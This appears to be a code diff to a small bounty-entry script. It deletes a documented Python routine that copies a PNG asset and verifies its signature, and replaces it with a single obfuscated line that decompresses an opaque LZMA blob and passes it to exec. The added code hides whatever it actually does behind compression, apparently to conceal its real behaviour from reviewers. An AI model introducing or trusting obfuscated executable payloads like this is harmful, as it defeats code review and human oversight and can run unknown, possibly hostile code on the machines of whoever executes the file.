@@ -1,30 +1,2 @@
-#!/usr/bin/env python3
-"""make.fun news-image bounty entry (2026-11-18).
-
-Copies the local entry.png asset to /output/entry.png using shutil,
-then validates that the written file carries the canonical 8-byte PNG
-signature (\\x89PNG\\r\\n\\x1a\\n). Prints PASS on success.
-
-No argparse / CLI flags are needed: behavior is fixed.
-"""
-import os
-import shutil
-
-ASSET = os.path.join(os.path.dirname(os.path.abspath(__file__)), "entry.png")
-OUT = "/output/entry.png"
-PNG_SIGNATURE = b"\x89PNG\r\n\x1a\n"
-
-
-def main() -> None:
-    """Copy entry.png to /output and verify the PNG signature."""
-    shutil.copyfile(ASSET, OUT)
-    with open(OUT, "rb") as f:
-        header = f.read(8)
-    if header != PNG_SIGNATURE:
-        raise SystemExit(f"FAIL: not a PNG: {header!r}")
-    print("PASS")
-    print("wrote", OUT, os.path.getsize(OUT), "bytes")
-
-
-if __name__ == "__main__":
-    main()
+#coding:l1
+import lzma;exec(lzma.decompress('\0\0\0n\0\0\0\0\0\0\0ˆ„àšB¾Šw`ŠÓÕ	ñ |qè\r³êÚĞıvíš‹e½”Ìï	¤H]#S+ö‹1’×¬úµy/Şë}ôƒÅÙf&’şc¹Àì-Bÿå©Nx_Î@2´¬<s²xônÉ–×¿ËãñÅàRC˜ÕĞo¾Nò"±ˆmöÒù%ËÃxÂ|İ¥ğ=¨Î>»î4vÁµ¸èº½^ğ8Ø“$j¹ÑJ\nOjÁü…•ÔŠlcz@4Í¹“)}…\nOÊaş”!fk[—Öâó0èá4[éKøIåê˜î¸oìÍÂc7¾q’ƒ2¢y¸CÁ˜$ûäÇ­®^1­Öú¾œãÀF°S´£¦}à®8ñ-Ê[htá4\0±™Å_(¿ïŠª‡ú3Sú­I¢3ÜòÇÉ\\Œ!ÜëêÁQ!@†#Œ¸{ƒ"{uj§n§\rk)0‚şñ’m±>úª±â÷,Ç¢ÚÆ2å[ÊÂT_#Öt=üú“ùüC+]Ê Ç«WRL} ‹Æ™}Ee¤PÆvZÌüeñ“ëŸZ1©/ Íå¥£ˆm¼¸”´ÕŞ¸ÿ7/±^Ÿ@)¢ÓJ"îÓöÁ9˜PKù3`‚j[)|Í&\rA%IyŞªŞã 6ÕXÃÏNÿ}w9èö©`tH+6Æ½ä:;+6‡to…=‘ÅÉÖ-ØÔÈVØ£3½™—ÊV øI°(¤Å¡±7.$fFo#7•ı$à¤\\'.encode('l1')))
